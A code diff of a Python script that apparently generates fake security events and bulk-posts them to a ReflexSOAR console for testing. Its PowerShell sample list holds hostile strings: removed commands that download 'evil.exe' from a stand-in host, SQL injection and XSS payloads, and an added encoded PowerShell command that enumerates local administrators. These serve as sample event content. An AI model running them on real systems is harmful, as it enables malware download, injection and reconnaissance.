@@ -9,17 +9,19 @@ import socket
 import struct
 import sys
 import uuid
+from concurrent.futures import ThreadPoolExecutor
 
 host = 'http://localhost'
 
 AUTH_TOKEN = None
 
-USERNAME = sys.argv[1]
-PASSWORD = sys.argv[2]
-EVENT_COUNT = int(sys.argv[3])
+CONSOLE = sys.argv[1]
+USERNAME = sys.argv[2]
+PASSWORD = sys.argv[3]
+EVENT_COUNT = int(sys.argv[4])
 
 def auth():
-    response = requests.post('{}/api/v2.0/auth/login'.format(host),
+    response = requests.post('{}/api/v2.0/auth/login'.format(CONSOLE),
                              data=json.dumps({'email':USERNAME, 'password':PASSWORD}),
                              headers={'Content-Type': 'application/json'}, verify=False)
     if response.status_code == 200:
@@ -29,17 +31,19 @@ def auth():
         print(response.text)
         return None
 
+token = auth()
 
 def bulk(events):
 
-    token = auth()
+    
     
     if token:
         headers = {
             'Content-Type': 'application/json',
             'Authorization': 'Bearer '+token
         }
-        response = requests.post('{}/api/v2.0/event/_bulk'.format(host),
+
+        response = requests.post('{}/api/v2.0/event/_bulk'.format(CONSOLE),
                                  data=json.dumps({"events": events}),
                                  headers=headers, verify=False)
         if response.status_code == 200:
@@ -51,7 +55,6 @@ def bulk(events):
     
 def reference():
     return str(uuid.uuid4())
-
 
 def case_templates():
   
@@ -123,16 +126,8 @@ def random_ip():
 
 def random_powershell_command():
   commands = [
-    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
-    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
-    'administrator") OR 1=1 --;',
-    'alert(1);',
-    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
-    '<IMG SRC="javascript:alert(\'XSS\');">',
-    '<IMG SRC=javascript:alert(\'XSS\')>',
-    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
-    '<script>alert(\'xss\')</script>'
-    '<iframe src="http://docs.reflexsoar.com/en/latest/"/>'
+
+    'cmd.exe" /C powershell -NonInteractive -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAHQAZQB4AHQAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0AQwBvAG0AbQBhAG4AZAAgACcAJgAgAHsARwBlAHQALQBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBHAHIAbwB1AHAAIAAnACcAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACcAJwAgAHwAIABzAGUAbABlAGMAdAAgAE4AYQBtAGUAfQAnACAAPgAgACIAQwA6AFwAVQBzAGUAcgBzAFwATgBCAEEAUwBDAFUAfgAxAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABwAG8AdwBlAHIAYwBsAGkAdgBtAHcAYQByAGUAMQA3ADcAIgA7ACAAZQB4AGkAdAAgACQAbABhAHMAdABlAHgAaQB0AGMAbwBkAGUA'
   ]
 
   return commands[random.randint(0, len(commands)-1)]
@@ -162,7 +157,7 @@ def random_event():
       "severity": random_severity(),
       "observables": [
         {
-          "value": hostname,
+          "value": "ha-l-carroll",
           "ioc": False,
           "tlp": 2,
           "spotted": False,
@@ -316,7 +311,7 @@ def random_event():
         }
       ],
       #"raw_log": json.dumps({"destination":{"ip": ip}})
-      "raw_log": json.dumps({'match_body': {'event_data': {'TargetUserName': 'svc_justin'}}})
+      "raw_log": json.dumps({'match_body': {'event_data': {'TargetUserName': 'svc_justin'}}, 'host': {'name': 'HA-D-Awalt'}, 'user': {'name': 'josh', 'domain': 'TELLARO', 'target': {'name': 'justin', 'domain': 'TELLARO'}}})
     }
   ]
 
@@ -337,8 +332,9 @@ for i in range(0,EVENT_COUNT):
   #  event['reference'] = reference()
   #  events.append(event)
 
-  if len(events) >= 50 or len(events) == EVENT_COUNT:
-    print("Sending {} events...".format(len(events)))
-    bulk(events)
-    events = []
-    time.sleep(1)
+# Split the events into 250 event chunks and send them
+# in parallel using a thread pool
+chunks = [events[x:x+250] for x in range(0, len(events), 250)]
+
+with ThreadPoolExecutor(max_workers=10) as executor:
+  executor.map(bulk, chunks)
